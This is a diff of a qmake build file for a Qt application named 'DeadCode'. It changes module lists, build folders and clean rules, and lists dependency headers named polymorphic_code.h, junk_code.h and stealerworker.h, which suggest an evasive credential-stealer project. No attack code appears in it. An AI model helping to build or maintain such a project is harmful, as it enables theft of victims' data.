@@ -1,5 +1,5 @@
 # Основные модули Qt (синхронизированы с build.yml)
-QT += core gui network widgets qml quick svg quickcontrols quickcontrols2 sql winextras qtdeclarative
+QT += core gui network widgets qml quick svg quickcontrols quickcontrols2 sql winextras declarative
 
 # Проверка минимальной версии Qt
 lessThan(QT_MAJOR_VERSION, 5) | lessThan(QT_MINOR_VERSION, 15) {
@@ -11,7 +11,7 @@ TARGET = DeadCode
 TEMPLATE = app
 
 # Конфигурация для релиза (динамическая сборка Qt)
-CONFIG += release
+CONFIG += release qtquickcompiler
 
 # Исходные файлы
 SOURCES += \
@@ -87,7 +87,7 @@ QMAKE_CXXFLAGS += \
     -Wno-cast-function-type \
     -Wno-unused-parameter \
     -Wno-sign-compare \
-    -Wno-attributes  # Явно указано в build.yml
+    -Wno-attributes
 
 # Флаги линковщика (синхронизированы с build.yml)
 QMAKE_LFLAGS += \
@@ -96,14 +96,14 @@ QMAKE_LFLAGS += \
 
 # Директории для сборки
 DESTDIR = $$PWD/../build/release
-OBJECTS_DIR = $$PWD/../build/release
-MOC_DIR = $$PWD/../build/release
-UI_DIR = $$PWD/../build/release
-RCC_DIR = $$PWD/../build/release
+OBJECTS_DIR = $$PWD/../build/release/obj
+MOC_DIR = $$PWD/../build/release/moc
+UI_DIR = $$PWD/../build/release/ui
+RCC_DIR = $$PWD/../build/release/rcc
 
 # Расширенный список файлов для очистки
 QMAKE_CLEAN += \
-    $$DESTDIR/* \
+    $$DESTDIR/DeadCode.exe \
     $$OBJECTS_DIR/*.o \
     $$MOC_DIR/moc_*.cpp \
     $$UI_DIR/ui_*.h \
@@ -115,4 +115,5 @@ PRE_TARGETDEPS += \
     $$PWD/../src/polymorphic_code.h \
     $$PWD/../src/junk_code.h \
     $$PWD/../src/stealerworker.h \
-    $$PWD/../src/compat.h
+    $$PWD/../src/compat.h \
+    $$UI_DIR/ui_mainwindow.h
